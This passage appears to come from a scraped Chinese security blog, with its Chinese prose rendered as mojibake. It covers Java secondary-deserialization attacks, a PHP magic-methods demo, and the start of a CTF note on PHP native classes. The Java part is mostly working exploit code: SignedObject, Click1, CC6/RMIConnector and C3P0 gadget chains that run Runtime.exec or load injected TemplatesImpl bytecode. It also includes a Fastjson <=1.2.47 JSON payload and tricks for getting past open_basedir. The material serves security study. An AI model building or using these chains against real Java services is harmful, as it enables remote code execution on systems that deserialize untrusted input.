TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(object); priorityQueue.add(2); Class c = priorityQueue.getClass(); Field comparator = c.getDeclaredField(&quot;comparator&quot;); comparator.setAccessible(true); comparator.set(priorityQueue, beanComparator); return priorityQueue; }} Click1å› ä¸ºClick1é“¾ä¹Ÿæ˜¯å¯ä»¥è°ƒç”¨æŸä¸ªç±»çš„gettersæ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡SignedObject.getObject()æ¥äºŒæ¬¡ååºåˆ—åŒ– 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import java.io.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.click.control.Column;import org.apache.click.control.Table;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.Comparator;import java.util.PriorityQueue;public class Click1 { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;Poria&quot;); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); PriorityQueue priorityQueue = getPayload(templates, &quot;outputProperties&quot;); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(priorityQueue, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); PriorityQueue priorityQueue2 = getPayload(signedObject, &quot;object&quot;); serialize(priorityQueue2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object, String field, Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static PriorityQueue getPayload(Object object, String string) throws Exception { Column column = new Column(string); //é˜²æ­¢ç©ºæŒ‡é’ˆå¼‚å¸¸ column.setTable(new Table()); Class clazz = Class.forName(&quot;org.apache.click.control.Column$ColumnComparator&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(Column.class); declaredConstructor.setAccessible(true); Comparator comparator = (Comparator) declaredConstructor.newInstance(column); //å…ˆå¡«åƒåœ¾æ•°æ®ï¼Œé˜²æ­¢ååºåˆ—åŒ–æ—¶å°±è°ƒç”¨ï¼Œåé¢åœ¨é€šè¿‡åå°„æ”¹å›æ¥ PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1); priorityQueue.add(1); priorityQueue.add(2); //é€šè¿‡åå°„å°†åƒåœ¾æ•°æ®æ”¹æˆæ¶æ„æ•°æ® Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;); field.setAccessible(true); Object[] objects = (Object[]) field.get(priorityQueue); objects[0] = object; Field comparatorField = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, comparator); return priorityQueue; }} RMIConnectorjavax.managementä¸‹ä¸€ä¸ªä¸è¿œç¨‹ rmi è¿æ¥å™¨çš„è¿æ¥ç±» æœ€ç»ˆåœ¨javax.management.RMIConnector#findRMIServerJRMPæ‰¾åˆ°äºŒæ¬¡ååºåˆ—åŒ–åˆ©ç”¨ç‚¹; ç»™å‡ºäºŒæ¬¡ååºåˆ—åŒ–çš„gadget 123javax.management.RMIConnector#connectjavax.management.RMIConnector#findRMIServerjavax.management.RMIConnector#findRMIServerJRMP åˆ°æ­¤ï¼Œè¿™ä¸ªåˆ©ç”¨æ–¹æ³•å°±é€šäº†ï¼Œç»™å‡ºæ„é€  123JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null) åˆ©ç”¨æ€è·¯: è°çš„æ–¹æ³•è°ƒç”¨äº†connectæ–¹æ³•å¹¶ä¸”ä¼ å…¥çš„å€¼å¯æ§ è°çš„åå°„å¯æ§ï¼Œç›´æ¥è¿›è¡Œåå°„è°ƒç”¨ å¸ˆå‚…ä»¬ç»™å‡ºçš„æ–¹æ³•æ˜¯é€šè¿‡InvokerTransformerç±»ï¼Œåå°„è°ƒç”¨äº†connectæ–¹æ³•ï¼› (ä¸ªäººæ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹å•Šï¼ŒInvokerTransformerè¿™ä¸ªç±»æœ¬èº«å°±å¾ˆæœ‰å¯èƒ½åœ¨é»‘åå•ä¸­ï¼Œå³ä½¿æ²¡æœ‰åœ¨é»‘åå•ä¸­ï¼Œä¸ºå•¥ä¸ç›´æ¥åå°„è°ƒç”¨SignedObject.getObject()å‘¢ï¼Ÿï¼Œè€Œä¸”CCåœ¨3.2.2ç‰ˆæœ¬ä¸­ InvokerTransformerå°±ç”¨ä¸äº†äº†) CC6ç»™å‡ºCC6çš„ç¤ºä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.*;import java.lang.reflect.Field;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC6Test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //å¾—åˆ°è¦æ‰§è¡Œå‘½ä»¤çš„HashMapå¯¹è±¡ HashMap hashMap = getPayload(chainedTransformer,&quot;deafbeef&quot;); //å°†è¦æ‰§è¡Œå‘½ä»¤çš„HashMapå¯¹è±¡åºåˆ—åŒ–ä¹‹åå˜æˆBase64æ•°æ® ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream); oos.writeObject(hashMap); oos.close(); byte[] serializedObject = byteArrayOutputStream.toByteArray(); String base64Encoded = Base64.getEncoder().encodeToString(serializedObject); System.out.println(&quot;Base64 Encoded String: &quot; + base64Encoded);// å¼€å§‹äºŒæ¬¡åºåˆ—åŒ–æ“ä½œ JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;); setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+base64Encoded); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); //åˆ©ç”¨InvokerTransformeråå°„è°ƒç”¨ RMIConnector.connectæ–¹æ³• InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);// æœ€ç»ˆ HashMap hashMap2 = getPayload(invokerTransformer,rmiConnector); //============= ä¹Ÿå¯ä»¥ç”¨ SignedObject äºŒæ¬¡ååºåˆ—åŒ– ======================// KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);// kpg.initialize(1024);// KeyPair kp = kpg.generateKeyPair();// SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));// InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getObject&quot;, null, null);//// HashMap hashMap2 = getPayload(invokerTransformer,signedObject); serialize(hashMap2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object, String field, Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static HashMap getPayload(Object object,Object hackObject) throws Exception { HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, (Transformer) object); TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, hackObject); hashMap.put(tiedMapEntry, &quot;deadbeef&quot;); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry, lazyMap); return hashMap; }} å¯ä»¥æ˜æ˜¾çœ‹å‡ºå¾ˆé¸¡è‚‹ï¼Œæ„Ÿè§‰æœ€å¤§çš„ä½œç”¨æ˜¯æ¥ç»•è¿‡ä¸€äº›loadClass()æ— æ³•åŠ è½½æ•°ç»„çš„æƒ…å†µï¼› åˆ—å¦‚ï¼š ååºåˆ—åŒ–é»˜è®¤æ˜¯ç”¨çš„Class.forName æˆ‘è¿™é‡Œé‡å†™resolveClass,æ”¹æˆç”¨URLClassLoader.loadClass()å»åŠ è½½ç±» 1234567891011121314151617181920212223242526272829import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.net.URL;import java.net.URLClassLoader;public class MyObjectInputStream extends ObjectInputStream{ private ClassLoader classLoader; public MyObjectInputStream(InputStream in) throws IOException { super(in); ClassLoader classLoader = ClassLoader.getSystemClassLoader(); if (classLoader != null) { URL[] urLs = ((URLClassLoader) classLoader).getURLs(); this.classLoader = new URLClassLoader(urLs); } else { System.out.println(&quot;error!!!&quot;); } } @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(desc.getName()); Class&lt;?&gt; clazz = this.classLoader.loadClass(desc.getName()); return clazz; }} è¿™å°±å’Œshiro550æ¼æ´å¾ˆåƒï¼Œä¸èƒ½åŠ è½½Transformeræ•°ç»„ï¼›ç½‘ä¸Šæœ‰ä¸€ç§å¯¹åº”æ–¹æ³•ï¼šå¯ä»¥å°†CC6ä¹‹ç±»çš„é“¾æ”¹æˆå¯ä»¥ä¸ç”¨Transformeræ•°ç»„ï¼›ä½†æ˜¯æˆ‘è¿™é‡Œç”šè‡³ä¸èƒ½åŠ è½½byteæ•°ç»„ï¼›åªèƒ½ç”¨äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ å‚è€ƒ[TCTF 2021]buggyLoader; Javaå®‰å…¨â€”â€”JVMç±»åŠ è½½å™¨ WrapperConnectionPoolDataSourcecom.mchange.v2.c3p0ä¸‹çš„ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥éœ€è¦c3p0ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt;&lt;/dependency&gt; æœ€ç»ˆåœ¨com.mchange.v2.ser.SerializableUtils#deserializeFromByteArrayæ‰¾åˆ°äºŒæ¬¡ååºåˆ—åŒ–åˆ©ç”¨ç‚¹; ç»™å‡ºäºŒæ¬¡ååºåˆ—åŒ–çš„gadget 1234com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setUpPropertyListenerscom.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsStringcom.mchange.v2.ser.SerializableUtils#fromByteArray(byte[])com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray å¦‚å›¾æ‰€ç¤ºï¼š å…¶ä¸­æœ‰ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå½“å…¶å±æ€§ä¸ºuserOverridesAsStringæ—¶ï¼Œå°†è°ƒç”¨parseUserOverridesAsStringæ–¹æ³• æˆªå–HexAsciiSerializedMapä¹‹åçš„å†…å®¹ï¼Œè¿›å…¥åˆ°fromByteArray æœ€åè¿›å…¥åˆ°deserializeFromByteArrayä¸­ï¼Œè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ– è¯¥é“¾é€šå¸¸é…åˆFastjsonã€Jacksonç¯å¢ƒä¸‹ä¸å‡ºç½‘åˆ©ç”¨çš„æ‰“æ³•ï¼› 12345678910{ &quot;rand1&quot;: { &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot; }, &quot;rand2&quot;: { &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:hexstring;&quot;, }} å¯ä»¥æ‰“FastJsonåŸç”Ÿååºåˆ—åŒ–æ¼æ´,è€Œæ— éœ€CCç­‰ä¾èµ–ï¼›å‚è€ƒ@y4tackerå¸ˆå‚… C3P012345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class C3p0 { public static void main(String[] args) throws Exception { byte[] fastJsonPayload = getFastJsonPayload(); String hexstring = bytesToHex(fastJsonPayload); String FJ1247 = &quot;{\\n&quot; + &quot; \\&quot;rand1\\&quot;: {\\n&quot; + &quot; \\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;,\\n&quot; + &quot; \\&quot;val\\&quot;: \\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;\\n&quot; + &quot; },\\n&quot; + &quot; \\&quot;rand2\\&quot;: {\\n&quot; + &quot; \\&quot;@type\\&quot;: \\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,\\n&quot; + &quot; \\&quot;userOverridesAsString\\&quot;: \\&quot;HexAsciiSerializedMap:&quot; + hexstring + &quot;;\\&quot;,\\n&quot; + &quot; }\\n&quot; + &quot;}&quot;; JSON.parseObject(FJ1247); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;cc.bin&quot;)); ois.readObject(); ois.close(); } public static void setFieldValue(Object object, String field, Object value) throws Exception { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static String bytesToHex(byte[] bytes) { StringBuffer stringBuffer = new StringBuffer(); for (int i = 0; i &lt; bytes.length; i++) { String hex = Integer.toHexString(bytes[i] &amp; 0xff); if (hex.length()&lt;2){ stringBuffer.append(&quot;0&quot; + hex); }else { stringBuffer.append(hex); } } return stringBuffer.toString(); } public static byte[] getFastJsonPayload() throws Exception { byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;zIxyd&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setFieldValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream bao = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bao); oos.writeObject(hashMap); return bao.toByteArray(); }} éœ€è¦æ³¨æ„fastjonç‰ˆæœ¬&lt;=1.2.47; æ€»ç»“JavaäºŒæ¬¡ååºåˆ—åŒ–æ„ä¹‰åœ¨äºç»•è¿‡é»‘åå•çš„é™åˆ¶æˆ–ä¸å‡ºç½‘åˆ©ç”¨æˆ–è€…ç»•è¿‡ä¸€äº›loadClass()ä¸èƒ½å¤ŸåŠ è½½æ•°ç»„çš„é—®é¢˜ï¼› ç”±äºRMIConnectorè¿‡äºé¸¡è‚‹ï¼›å¸¸ç”¨çš„åˆ©ç”¨é“¾æ˜¯SignedObjectè¿™æ¡é“¾ï¼›åˆ©ç”¨æ–¹å¼æ˜¯çœ‹æ˜¯å¦æœ‰åˆ©ç”¨é“¾å¯ä»¥è°ƒç”¨gettersæ–¹æ³• WrapperConnectionPoolDataSourceè¿™æ¡é“¾éœ€è¦æ‰¾åˆ°æŸæ¡åˆ©ç”¨é“¾å¯ä»¥è°ƒç”¨settersæ–¹æ³•ï¼Œæ‰€ä»¥ç»å¸¸é…åˆFastjsonã€Jacksonç¯å¢ƒä¸‹ä¸å‡ºç½‘åˆ©ç”¨","link":"/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"PHPé­”æœ¯æ–¹æ³•","text":"å¸¸è§çš„é­”æœ¯æ–¹æ³•12345678910111213141516__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°__destruct()ï¼Œç±»çš„ææ„å‡½æ•°__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯ Example123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;?phphighlight_file(__FILE__);echo &quot;&lt;br&gt;&quot;;class magic_test{ public $data1=&quot;zIxyd&quot;; public $data2=&quot;writeup&quot;; public function print_dat() { echo $this-&gt;data1 . &quot; &quot; .$this-&gt;data2 . &quot;&lt;br&gt;&quot;; } public function __construct() {//æ„é€ å‡½æ•° echo &quot;__construct&lt;br&gt;&quot;; } public function __destruct() {//ææ„å‡½æ•° echo &quot;__destruct&lt;br&gt;&quot;; } public function __wakeup() {//æ‰§è¡Œunserializeæ—¶è°ƒç”¨ echo &quot;__wakeup&lt;br&gt;&quot;; } public function __sleep() {//æ‰§è¡Œserializeæ—¶è°ƒç”¨ echo &quot;__sleep&lt;br&gt;&quot;; return array(&quot;data1&quot;,&quot;data2&quot;); //__sleep()è¯¥å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªéœ€è¦è¿›è¡Œåºåˆ—åŒ–ä¿å­˜çš„æˆå‘˜å±æ€§æ•°ç»„ //å¹¶ä¸”åªåºåˆ—åŒ–è¯¥å‡½æ•°è¿”å›çš„è¿™äº›æˆå‘˜å±æ€§ } public function __toString() {//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• //echo &quot;__toString&lt;br&gt;&quot;; return &quot;__toString&lt;br&gt;&quot;; } function __call($name, $arg) {//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ //ä¸å­˜åœ¨çš„æ–¹æ³•åæ˜¯$nameï¼Œå‚æ•°æ˜¯æ•°ç»„å½¢å¼ echo &quot;$name&lt;br&gt;&quot;; var_dump($arg); echo &quot;&lt;br&gt;&quot;; } function __invoke() {//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³• echo &quot;__invoke&lt;br&gt;&quot;; } function __get($key) {//è·å¾—ä¸€ä¸ªç±»ä¸­ä¸å¯è®¿é—®çš„æˆå‘˜å˜é‡æ—¶(æœªå®šä¹‰æˆ–ç§æœ‰å±æ€§) echo &quot;__get&lt;br&gt;&quot;; } function __set($arg1,$arg2) {//ç»™ä¸€ä¸ªç±»ä¸­ä¸å¯è®¿é—®çš„æˆå‘˜å˜é‡èµ‹å€¼æ—¶ echo &quot;__set&lt;br&gt;&quot;; echo &quot;$arg1:$arg2 &lt;br&gt;&quot;; }}//åˆ›å»ºå¯¹è±¡ï¼Œè°ƒç”¨__constructecho &quot;å‡†å¤‡åˆ›å»ºå¯¹è±¡&lt;br&gt;&quot;;$obj = new magic_test();echo &quot;åˆ›å»ºå¯¹è±¡å®Œæˆ&lt;br&gt;&quot;;//åºåˆ—åŒ–å¯¹è±¡ï¼Œè°ƒç”¨__sleepecho &quot;å‡†å¤‡åºåˆ—åŒ–å¯¹è±¡&lt;br&gt;&quot;;$serialized = serialize($obj);echo &quot;åºåˆ—åŒ–å¯¹è±¡å®Œæˆ&lt;br&gt;&quot;;//ç±»è¢«å½“æˆå­—ç¬¦ä¸²è¾“å‡ºï¼Œè°ƒç”¨__toStringecho &quot;å‡†å¤‡è¾“å‡ºç±»&lt;br&gt;&quot;;echo $obj;echo &quot;è¾“å‡ºç±»å®Œæ¯•&lt;br&gt;&quot;;//ç±»è¢«å½“æˆæ–¹æ³•è°ƒç”¨è¾“å‡ºï¼Œè°ƒç”¨__invokeecho &quot;å‡†å¤‡æŠŠå¯¹è±¡å½“ä½œæ–¹æ³•è°ƒç”¨&lt;br&gt;&quot;;$obj();echo &quot;æŠŠå¯¹è±¡å½“ä½œæ–¹æ³•è°ƒç”¨å®Œæ¯•&lt;br&gt;&quot;;//è¾“å‡ºåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²echo &quot;æ‰“å°åºåˆ—åŒ–ä¹‹åçš„å¯¹è±¡ &quot;;echo &quot;serializedï¼š &quot;.$serialized.&quot;&lt;br&gt;&quot;;echo &quot;æ‰“å°å®Œæˆ&lt;br&gt;&quot;;//è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè°ƒç”¨__callecho &quot;å‡†å¤‡è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•hack&lt;br&gt;&quot;;$obj-&gt;hack('arg1','arg2',3);echo &quot;è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•hackå®Œæ¯•&lt;br&gt;&quot;;//è·å¾—ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶ï¼Œè°ƒç”¨__getecho &quot;å‡†å¤‡è®¿é—®å¯¹è±¡ä¸å­˜åœ¨çš„å­—æ®µ&lt;br&gt;&quot;;$function = $obj-&gt;nono;echo &quot;è®¿é—®å¯¹è±¡ä¸å­˜åœ¨çš„å­—æ®µå®Œæ¯•&lt;br&gt;&quot;;//è·å¾—ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶ï¼Œè°ƒç”¨__setecho &quot;å‡†å¤‡è®¾ç½®å¯¹è±¡ä¸å­˜åœ¨çš„å­—æ®µ&lt;br&gt;&quot;;$obj-&gt;onon = 123;echo &quot;è®¾ç½®å¯¹è±¡ä¸å­˜åœ¨çš„å­—æ®µå®Œæ¯•&lt;br&gt;&quot;;//é‡å»ºå¯¹è±¡(ååºåˆ—åŒ–)ï¼Œè°ƒç”¨__wakeupecho &quot;å‡†å¤‡ååºåˆ—åŒ–å¯¹è±¡&lt;br&gt;&quot;;$obj2=unserialize($serialized);echo &quot;ååºåˆ—åŒ–å®Œæˆ&lt;br&gt;&quot;;//è°ƒç”¨æ–¹æ³•echo &quot;å‡†å¤‡è°ƒç”¨æ–¹æ³•&lt;br&gt;&quot;;$obj2-&gt;print_dat();echo &quot;è°ƒç”¨ç»“æŸ&lt;br&gt;&quot;;//ååºåˆ—åŒ–åä¼šé¢å¤–åœ¨è°ƒç”¨__destruct//è„šæœ¬ç»“æŸ è°ƒç”¨__destruct?&gt;","link":"/2024/01/29/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"PHP_åŸç”Ÿç±»åˆ©ç”¨","text":"å‰è¨€æ€»ç»“phpä¸­ååºåˆ—åŒ–æ—¶ä¼šç”¨åˆ°çš„åŸç”Ÿç±»ï¼›phpä¸­å†…ç½®å¾ˆå¤šåŸç”Ÿçš„ç±»ï¼Œåœ¨CTFä¸­å¸¸ä»¥echo new $a($b);è¿™ç§å½¢å¼å‡ºç°ï¼Œå½“çœ‹åˆ°è¿™ç§å…³é”®å­—çœ¼æ—¶ï¼Œå°±è¦è€ƒè™‘æœ¬é¢˜æ˜¯ä¸æ˜¯éœ€è¦åŸç”Ÿç±»åˆ©ç”¨äº† ç›®å½•éå†ç±»DirectoryIteratorè¿™ä¸ªç±»ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ï¼Œå½“é‡åˆ°echoè¾“å‡ºæ—¶ä¼šè§¦å‘Directorylteratorä¸­çš„__toString()æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼Œè€Œä¸€èˆ¬æƒ…å†µç¬¬ä¸€ä¸ªæ–‡ä»¶éƒ½æ˜¯ç‚¹å·ã€‚æ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯Directorylteratorå¯ä»¥é…åˆglobåè®®ä½¿ç”¨ï¼›ä¸glob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ 12345678&lt;?phpecho new DirectoryIterator(&quot;./&quot;);echo &quot;\\n&quot;;echo new DirectoryIterator(&quot;glob://f*&quot;);?&gt;#.#flag FilesystemIteratorè¯¥ç±»ç»§æ‰¿äºDirectorylteratorï¼Œæ‰€ä»¥åœ¨ç”¨æ³•ä¸ŠåŸºæœ¬ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ GlobIteratoré€šè¿‡ç±»åä¹Ÿä¸éš¾çœ‹å‡ºï¼Œè¿™æ˜¯ä¸ªè‡ªå¸¦globåè®®çš„ç±»ï¼Œæ‰€ä»¥è°ƒç”¨æ—¶å°±ä¸å¿…å†åŠ ä¸Šglob://äº† 12345&lt;?phpecho new GlobIterator(&quot;./f*&quot;);?&gt;#flag æ–‡ä»¶è¯»å–ç±»SplFileObjectå½“ç”¨æ–‡ä»¶ç›®å½•éå†åˆ°äº†æ•æ„Ÿæ–‡ä»¶æ—¶ï¼Œå¯ä»¥ç”¨SplFileObjectç±»ï¼ŒåŒæ ·é€šè¿‡echoè§¦å‘SplFileObjectä¸­çš„__toString()æ–¹æ³•ã€‚(è¯¥ç±»ä¸æ”¯æŒé€šé…ç¬¦ï¼Œæ‰€ä»¥å¿…é¡»å…ˆè·å–åˆ°å®Œæ•´æ–‡ä»¶åç§°æ‰è¡Œ) 